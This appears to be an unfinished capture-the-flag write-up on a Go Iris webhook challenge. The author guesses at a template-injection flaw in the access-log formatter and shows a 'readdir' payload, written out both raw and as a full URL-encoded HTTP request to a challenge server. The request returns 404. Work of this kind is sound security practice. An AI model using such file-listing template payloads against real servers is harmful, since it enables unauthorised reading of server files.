Given source code and hint
hint: Start point to write the access log: [https://github.com/kataras/iris/blob/main/middleware/accesslog/accesslog.go#L960](https://github.com/kataras/iris/blob/main/middleware/accesslog/accesslog.go#L960)

 [webhook.zip](https://s.kryptos.id/files/a4e51960c3fa01cb98c0e2d21e1e56c7/webhook.zip?token=eyJ1c2VyX2lkIjozMSwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTF9.Z0FhWQ.0-wotm_ZtW0EwM2xgy5kJvAzloI "webhook.zip")

reading the Go documentation, the vulnerability might appear in `startLoggingHandler` function, possible exploit to do LFI via function
before that, I must have the request GET to /exec

when i try to post request like this
```
/exec?formatter={{range readdir ".."}}{{.Name}}{{"\n"}}{{end}}
```

with the url encoding become:

```
GET /exec?formatter=%7B%7Brange%20readdir%20%22..%22%7D%7D%7B%7B.Name%7D%7D%7B%7B%22%5Cn%22%7D%7D%7B%7Bend%7D%7D HTTP/1.1
Host: 152.118.201.242:9012
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

but the server is 404 error


